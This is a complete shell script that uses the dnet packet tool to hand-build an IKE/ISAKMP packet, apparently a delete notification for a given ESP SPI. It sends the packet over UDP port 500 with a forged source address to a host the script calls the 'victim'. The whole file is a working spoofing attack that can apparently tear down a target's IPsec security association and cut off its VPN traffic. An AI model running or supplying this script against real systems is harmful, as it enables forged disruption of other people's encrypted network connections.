#!/bin/sh
if [ ! $# -eq 3 ]; then
	echo "usage: $0 <faked-src> <victim> <spi>";
	exit;
fi

src=$1; dst=$2
spi=`echo $3 | sed 's/\(..\)/\\\\x\1/g'`
cky_i=`dd if=/dev/urandom bs=8 count=1 2>/dev/null`

dnet hex \
	$cky_i \
	"\x00\x00\x00\x00\x00\x00\x00\x00" \
	"\x01\x10\x02\x00" \
	"\x00\x00\x00\x00" \
	"\x00\x00\x00\x58" \
	"\x0c\x00\x00\x2c" \
	"\x00\x00\x00\x01" \
	"\x00\x00\x00\x01" \
	"\x00\x00\x00\x20" \
	"\x01\x01\x00\x01" \
	"\x00\x00\x00\x18" \
	"\x00\x01\x00\x00" \
	"\x80\x01\x00\x05" \
	"\x80\x02\x00\x02" \
	"\x80\x03\x00\x01" \
	"\x80\x04\x00\x02" \
	"\x00\x00\x00\x10" \
	"\x00\x00\x00\x01" \
	"\x03\x04\x00\x01" \
	$spi |
	dnet udp sport 500 dport 500 |
	dnet ip proto udp src $src dst $dst |
	dnet send
